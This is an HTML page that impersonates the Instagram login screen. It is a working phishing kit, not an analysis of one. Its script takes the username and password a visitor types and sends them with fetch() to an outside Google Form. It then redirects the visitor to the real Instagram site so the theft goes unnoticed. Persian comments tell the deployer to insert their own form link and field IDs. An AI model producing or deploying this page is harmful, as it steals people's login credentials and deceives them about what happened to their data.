<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram - Log in</title>
  <style>
    body { background: #fafafa; font-family: system-ui; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; }
    .container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px 20px; text-align: center; border-radius: 3px; }
    .logo { width: 175px; margin-bottom: 30px; }
    input { width: 90%; padding: 10px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; }
    button { width: 95%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
  </style>
</head>
<body>

<div class="container">
  <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
  
  <form id="loginForm">
    <input type="text" id="username" placeholder="Phone number, username, or email" required />
    <input type="password" id="password" placeholder="Password" required />
    <button type="submit">Log in</button>
  </form>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();

  if (!username || !password) {
    alert('Please fill both fields');
    return;
  }

  // اینجا لینک Google Form خودت را بگذار (pre-filled link)
  const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSfu-mXfWLScdqkxSDZw1bfzyF5FCChckYRarjfWyNI3op9ukQ/viewform?usp=pp_url";

  const data = new FormData();
  data.append("entry.123456789", username);   // شماره entry را از فرم خودت بگیر
  data.append("entry.987654321", password);   // شماره entry را از فرم خودت بگیر

  fetch(formUrl, {
    method: 'POST',
    body: data,
    mode: 'no-cors'
  }).then(() => {
    alert('Test saved! Redirecting to Instagram...');
    window.location.href = 'https://www.instagram.com';
  }).catch(() => {
    alert('Test saved! Redirecting...');
    window.location.href = 'https://www.instagram.com';
  });
});
</script>
</body>
</html>
